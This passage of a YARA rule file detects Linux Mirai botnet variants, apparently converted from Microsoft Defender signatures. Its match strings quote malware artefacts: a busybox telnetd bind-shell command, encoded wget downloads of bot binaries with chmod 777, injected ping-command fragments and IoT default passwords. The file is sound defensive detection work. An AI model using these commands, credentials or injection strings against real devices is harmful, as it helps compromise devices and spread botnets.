        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {50 8d 45 f3 6a 01 50 56 e8 [0-5] 83 c4 10 48 [0-5] 83 ec 0c 6a 04 e8 [0-5] 83 c4 10 0f be 45 f3 c1 e3 08 09 c3 81 fb 0a 0d 0a 0d}  //weight: 1, accuracy: Low
        $x_1_2 = {8d 9d 60 ff ff ff 51 68 80 00 00 00 53 56 e8 [0-5] ff 83 c4 10 85 c0 [0-5] 52 50 53 57 e8 [0-5] 83 c4 10}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_R_2147818248_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.R!MTB"
        threat_id = "2147818248"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8b 19 89 d0 01 d8 89 eb 30 18 89 d0 8b 19 01 d8 89 fb 30 18 89 d0 8b 19 01 d8 89 f3 30 18 89 d0 8b 19 42 01 d8 8a 1c 24 30 18 8b 41 04 25 ff ff 00 00 39 d0 7f ca}  //weight: 1, accuracy: High
        $x_1_2 = "rm -rf nig" ascii //weight: 1
        $x_1_3 = {77 67 65 74 20 68 74 74 70 [0-32] 2f 62 69 6e 73 2f [0-32] 20 2d 4f 20 6e 69 67}  //weight: 1, accuracy: Low
        $x_1_4 = "chmod 777 nig" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_U_2147818249_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.U!MTB"
        threat_id = "2147818249"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {8b 19 89 d0 01 d8 89 eb 30 18 89 d0 8b 19 01 d8 89 fb 30 18 89 d0 8b 19 01 d8 89 f3 30 18 89 d0 8b 19 42 01 d8 8a 1c 24 30 18 8b 41 04 25 ff ff 00 00 39 d0 7f ca}  //weight: 1, accuracy: High
        $x_1_2 = "MEINSM" ascii //weight: 1
        $x_1_3 = "TSUNAMI" ascii //weight: 1
        $x_1_4 = "XMHDIPC" ascii //weight: 1
        $x_1_5 = "TELECOMADMIN" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Mirai_BH_2147818335_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BH!MTB"
        threat_id = "2147818335"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {8b 19 89 d0 01 d8 89 eb 30 18 89 d0 8b 19 01 d8 89 fb 30 18 89 d0 8b 19 01 d8 89 f3 30 18 89 d0 8b 19 42 01 d8 8a 1c 24 30 18 8b 41 04 25 ff ff 00 00 39 d0 7f ca}  //weight: 1, accuracy: High
        $x_1_2 = "npxXoudifFeEgGaACScs" ascii //weight: 1
        $x_1_3 = {8b 14 08 89 53 10 8b 54 08 0c 66 89 53 14}  //weight: 1, accuracy: High
        $x_1_4 = {c7 43 34 00 00 00 00 89 43 30 c6 43 38 01 c6 43 39 03 c6 43 3a 03}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Mirai_BJ_2147818336_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BJ!MTB"
        threat_id = "2147818336"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {8b 19 89 d0 01 d8 89 eb 30 18 89 d0 8b 19 01 d8 89 fb 30 18 89 d0 8b 19 01 d8 89 f3 30 18 89 d0 8b 19 42 01 d8 8a 1c 24 30 18 8b 41 04 25 ff ff 00 00 39 d0 7f ca}  //weight: 1, accuracy: High
        $x_1_2 = "npxXoudifFeEgGaACScs" ascii //weight: 1
        $x_1_3 = "od029ejslkwn28d92ls02pwl20dgqnw" ascii //weight: 1
        $x_1_4 = "egvnmacnkr" ascii //weight: 1
        $x_1_5 = "hlLjztqZ" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Mirai_BG_2147818337_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BG!MTB"
        threat_id = "2147818337"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "zwnamsmqfhd" ascii //weight: 1
        $x_1_2 = "iklmhojd" ascii //weight: 1
        $x_1_3 = "cmnvmrOaYmnvhde" ascii //weight: 1
        $x_1_4 = "chmod +x shaker" ascii //weight: 1
        $x_1_5 = "npxXoudifFeEgGaACScs" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Mirai_V_2147818376_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.V!MTB"
        threat_id = "2147818376"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/bin/busybox telnetd -p 9731 -l /bin/sh" ascii //weight: 1
        $x_1_2 = "DVRBOT" ascii //weight: 1
        $x_1_3 = "VNhUR@M" ascii //weight: 1
        $x_1_4 = "/proc/cpuinfo" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Mirai_AQ_2147818396_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AQ!xp"
        threat_id = "2147818396"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "[killer] Finished" ascii //weight: 1
        $x_1_2 = "XANAX Botnet" ascii //weight: 1
        $x_1_3 = "mHoIJPqGRSTUVWXL" ascii //weight: 1
        $x_1_4 = "npxXoudifFeEgGaACScs" ascii //weight: 1
        $x_1_5 = "DEBUG MODE YO" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Mirai_AS_2147818397_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AS!xp"
        threat_id = "2147818397"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cFOKLKQVPCVMP" ascii //weight: 1
        $x_1_2 = "QWRGPTKQMP" ascii //weight: 1
        $x_1_3 = "LCOGQGPTGP" ascii //weight: 1
        $x_1_4 = "POST /cdn-cgi/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Mirai_AU_2147818398_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AU!xp"
        threat_id = "2147818398"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 77 67 65 74 20 68 74 74 70 3a 2f 2f [0-32] 2f}  //weight: 2, accuracy: Low
        $x_1_2 = "TVWSVPVT" ascii //weight: 1
        $x_1_3 = "POST /cdn-cgi/" ascii //weight: 1
        $x_1_4 = "/dev/null" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_AW_2147818542_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AW!MTB"
        threat_id = "2147818542"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_2_1 = {8b 19 89 d0 01 d8 89 eb 30 18 89 d0 8b 19 01 d8 89 fb 30 18 89 d0 8b 19 01 d8 89 f3 30 18 89 d0 8b 19 42 01 d8 8a 1c 24 30 18 8b 41 04 25 ff ff 00 00 39 d0}  //weight: 2, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_BA_2147818623_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BA!xp"
        threat_id = "2147818623"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "/bin/busybox" ascii //weight: 2
        $x_1_2 = "upgrade_handle.php" ascii //weight: 1
        $x_1_3 = "npxXoudifFeEgGaACScs" ascii //weight: 1
        $x_1_4 = "hlLjztqZ" ascii //weight: 1
        $x_1_5 = "chmod+777+wgetbin" ascii //weight: 1
        $x_1_6 = "sefDrop" ascii //weight: 1
        $x_1_7 = "ddos_flood_std" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((5 of ($x_1_*))) or
            ((1 of ($x_2_*) and 3 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_BB_2147818625_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BB!xp"
        threat_id = "2147818625"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = "/bin/busybox" ascii //weight: 2
        $x_2_2 = "sh/var/fkra" ascii //weight: 2
        $x_2_3 = {77 67 65 74 2b 68 74 74 70 3a 2f 2f [0-40] 74 6d 70 2f 67 61 66}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_AV_2147818680_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AV!MTB"
        threat_id = "2147818680"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "fuirewhfreiurhehiugerhguieruhirgeuihregiuhrge" ascii //weight: 1
        $x_1_2 = "reu9hfgreygfreiuerhferiuojfrbhuiferb" ascii //weight: 1
        $x_1_3 = "bypass" ascii //weight: 1
        $x_1_4 = "udprand" ascii //weight: 1
        $x_1_5 = "tcprand" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Mirai_BI_2147818744_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BI!MTB"
        threat_id = "2147818744"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "w5q6he3dbrsgmclkiu4to18npavj702f" ascii //weight: 1
        $x_1_2 = "killallbots" ascii //weight: 1
        $x_1_3 = "npxxoudiffeeggaacscs" ascii //weight: 1
        $x_1_4 = "/dev/FTWDT101_watchdog" ascii //weight: 1
        $x_1_5 = "ajwligf" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Mirai_P_2147818852_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.P!xp"
        threat_id = "2147818852"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {47 45 54 20 2f [0-16] (61 72 6d|2f 73) 20 48 54 54 50 2f 31 2e 30 0d 0a 0d 0a 00}  //weight: 1, accuracy: Low
        $x_1_2 = {10 31 9f e5 88 30 8d e5 02 30 a0 e3 08 11 9f e5 08 21 9f e5 b4 38 cd e1 04 01 9f e5 05 3a a0 e3 b6 38 cd e1 b2 ff ff eb 01 10 a0 e3 00 70 a0 e1 06 20 a0 e1 02 00 a0 e3 da ff ff eb 01 00 70 e3 01 00 77 13 00 50 a0 e1 01 00 a0 03 98 ff ff 0b 05 00 a0 e1 84 10 8d e2 10 20 a0 e3 af ff ff eb 00 00 50 e3 00 00 60 b2 91 ff ff bb 19 40 84 e2 05 00 a0 e1 ac 10 9f e5 04 20 a0 e1 b3 ff ff eb 04 00 50 e1 03 00 a0 13 89 ff ff 1b 98 80 9f e5}  //weight: 1, accuracy: High
        $x_1_3 = {47 45 54 20 2f 61 72 6d ?? 2e 62 6f 74 2e 6c 65 20 48 54 54}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule Backdoor_Linux_Mirai_AT_2147819147_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AT!xp"
        threat_id = "2147819147"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "g1abc4dmo35hnp2lie0kjf" ascii //weight: 1
        $x_1_2 = "GET /set_ftp.cgi" ascii //weight: 1
        $x_1_3 = "upload_interval=0" ascii //weight: 1
        $x_1_4 = "GET /ftptest.cgi" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Mirai_AW_2147819152_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AW!xp"
        threat_id = "2147819152"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {e5 00 20 93 e5 00 c0 92 e5 04 30 dc e5 07 00 53 e1 05 00 a0 11 04}  //weight: 1, accuracy: High
        $x_1_2 = {00 ea 00 c1 92 e7 04 30 dc e5 07 00 53 e1 04 00 00 0a 01 00 80 e2 01 00 50 e1}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_AW_2147819152_1
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AW!xp"
        threat_id = "2147819152"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {78 22 01 00 94 80 00 00 0d c0 a0 e1 00 d8 2d e9 04 b0 4c e2 0c}  //weight: 1, accuracy: High
        $x_1_2 = {e5 02 30 43 e2 14 30 0b e5 14 30 1b e5 01 00 53 e3 ef}  //weight: 1, accuracy: High
        $x_1_3 = {a8 9d e8 0d c0 a0 e1 00 d8 2d e9 04 b0 4c e2 24 d0 4d e2 24 00 0b e5 28 10 0b e5 30 30 0b e5 2c 20 4b e5 42}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_BL_2147819180_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BL!MTB"
        threat_id = "2147819180"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "dsnctodtoeupeupeup" ascii //weight: 1
        $x_1_2 = "vfmgufnhvgnhwhoiwhoiwhoi" ascii //weight: 1
        $x_1_3 = "1veqhbnf0veqicog1wfricog2xgsjdph2xgsjdph2xgsjdph" ascii //weight: 1
        $x_2_4 = {89 e8 8b 7c 24 50 89 f2 25 ff f7 f7 ff 89 44 24 10 8b 44 24 58 8d 4c 24 0c c7 44 24 18 00 00 00 00 89 7c 24 0c c7 44 24 1c 00 00 00 00 89 44 24 14 89 d8 c7 44 24 20 00 00 00 00}  //weight: 2, accuracy: High
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_BN_2147819181_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BN!MTB"
        threat_id = "2147819181"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "hwclvgaj" ascii //weight: 1
        $x_1_2 = "cfoklkqvpcvmp" ascii //weight: 1
        $x_1_3 = "qwrgptkqmp" ascii //weight: 1
        $x_1_4 = "lcogqgptgp" ascii //weight: 1
        $x_1_5 = "nkqvglkle" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Mirai_AZ_2147819250_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AZ!xp"
        threat_id = "2147819250"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {18 00 80 90 21 00 e0 a8 21 30 b1 00 ff 30 d3 00 ff 93 b4 00 4b 03 20 f8 09 24 10}  //weight: 1, accuracy: High
        $x_1_2 = {00 24 8f 99 80 cc 8f bf 00 54 8f be 00 50 8f b7 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_AY_2147819252_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AY!xp"
        threat_id = "2147819252"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {89 f1 29 d9 0f 84 0a ff ff ff 31 c0 8b 5c 24 1c 8a 44 24 2b 8b 74 24 24 83 f9 01 8d 1c de 8d 14 38 89 5c 24 34 8b 5c 24 1c 8a 02 88 44 de 04 0f 84 df fe ff ff 8a 42 01 31 db 8d 71 fe 88 c3 88 44 24 2b 39 de 0f 8c c9 fe ff ff 8d 7a 02}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_BD_2147819262_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BD!xp"
        threat_id = "2147819262"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "dreambox" ascii //weight: 2
        $x_2_2 = "xmhdipc" ascii //weight: 2
        $x_1_3 = "Is$uper@dmin" ascii //weight: 1
        $x_1_4 = "meinsm" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_BF_2147819264_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BF!xp"
        threat_id = "2147819264"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {64 65 73 74 49 50 3d 77 67 65 74 [0-32] 2f 62 69 6e 73 2e 73 68}  //weight: 1, accuracy: Low
        $x_1_2 = "%20sh%20bins.sh" ascii //weight: 1
        $x_1_3 = "cmdMethod=ping" ascii //weight: 1
        $x_1_4 = "6SRS>B" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_BE_2147819265_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BE!xp"
        threat_id = "2147819265"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/bin/busybox" ascii //weight: 1
        $x_1_2 = "DOS BOT KILLING" ascii //weight: 1
        $x_1_3 = "dropbear" ascii //weight: 1
        $x_1_4 = "var/tmp/sonia" ascii //weight: 1
        $x_1_5 = "Self Rep Fucking NeTiS" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Mirai_BH_2147819266_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BH!xp"
        threat_id = "2147819266"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {77 67 65 74 [0-38] 2f 74 6d 70 2f 73 6b 65 72 65}  //weight: 1, accuracy: Low
        $x_1_2 = "/tmp/skere duckys" ascii //weight: 1
        $x_1_3 = "SERVZUXO" ascii //weight: 1
        $x_1_4 = "/bin/busybox" ascii //weight: 1
        $x_1_5 = "chmod 777 * /tmp/skere" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Mirai_BG_2147819267_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BG!xp"
        threat_id = "2147819267"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "xmhdipc" ascii //weight: 1
        $x_1_2 = "udpplain" ascii //weight: 1
        $x_1_3 = "killproc" ascii //weight: 1
        $x_1_4 = "smcadmin" ascii //weight: 1
        $x_1_5 = "tsgoingon" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_Y_2147819334_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.Y!MTB"
        threat_id = "2147819334"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {03 20 a0 e1 8e 00 00 eb 00 30 a0 e1 00 00 53 e3 02 00 00 ca 01 30 a0 e3 30 34 0b e5 0d 00 00 ea 41 3e 4b e2 0c 30 43 e2 0c 30 43 e2 18 00 1b e5 03 10 a0 e1 10 20 a0 e3 17 02 00 eb 00 30 a0 e1 00 00 53 e3 02 00 00 aa 01 10 a0 e3 30 14 0b e5}  //weight: 1, accuracy: High
        $x_1_2 = {04 d0 4d e2 00 40 e0 e3 ?? 02 9f e5 ?? 45 8d e5 01 40 a0 e1 ?? ff ff eb ?? ?? 8d e2 ?? a0 8a e2 00 10 a0 e1 0a 00 a0 e1 ?? ?? 00 eb 04 30 94 e5 00 00 53 e3 ?? 12 9f e5 0a 00 a0 e1 03 10 a0 11 ?? ?? 00 eb}  //weight: 1, accuracy: Low
        $x_1_3 = {03 10 a0 e1 c8 30 9f e5 91 23 83 e0 23 33 a0 e1 b4 30 0b e5 b4 30 1b e5 03 21 a0 e1 82 31 a0 e1 03 30 62 e0 b4 20 1b e5 02 30 83 e0 03 31 a0 e1 01 10 63 e0 b4 10 0b e5 b4 30 1b e5 23 21 a0 e1 ?? ?? 9f e5 02 c1 93 e7 94 30 4b e2 03 00 a0 e1}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Backdoor_Linux_Mirai_Z_2147819335_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.Z!MTB"
        threat_id = "2147819335"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {a0 e1 18 10 1b e5 01 38 a0 e1 23 38 a0 e1 03 20 82 e0 ?? 20 0b e5 18 20 1b e5 22 38 a0 e1 18 10 1b e5 03 10 81 e0 18 10 0b e5 18 20 1b}  //weight: 1, accuracy: Low
        $x_1_2 = {e5 1c 30 1b e5 03 00 a0 e1 fc 10 9f e5 51 0b 00 eb 00 30 a0 e1 18 30 0b e5 18 30 1b e5 00 00 53 e3}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Backdoor_Linux_Mirai_BQ_2147819341_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BQ!MTB"
        threat_id = "2147819341"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {05 30 dc e7 00 00 53 e3 2e 00 53 13 00 40 c6 05 01 30 42 15 01 60 a0 01 00 40 a0 03 ff 40 0e 12 01 c0 8c e2 01 20 82 e2 00 30 6c e0 00 00 53 e3 01 e0 84 e2 01 10 42 e2 f0 ff ff ca}  //weight: 1, accuracy: High
        $x_1_2 = {06 30 d2 e7 22 30 23 e2 06 30 c2 e7 01 20 82 e2 07 00 52 e1 f9 ff ff 1a}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_AF_2147819487_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AF!xp"
        threat_id = "2147819487"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "SERVICE noop" ascii //weight: 1
        $x_1_2 = "GETFUCKING" ascii //weight: 1
        $x_1_3 = "MONKEY0:" ascii //weight: 1
        $x_1_4 = "well-knownLore" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_BI_2147819489_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BI!xp"
        threat_id = "2147819489"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
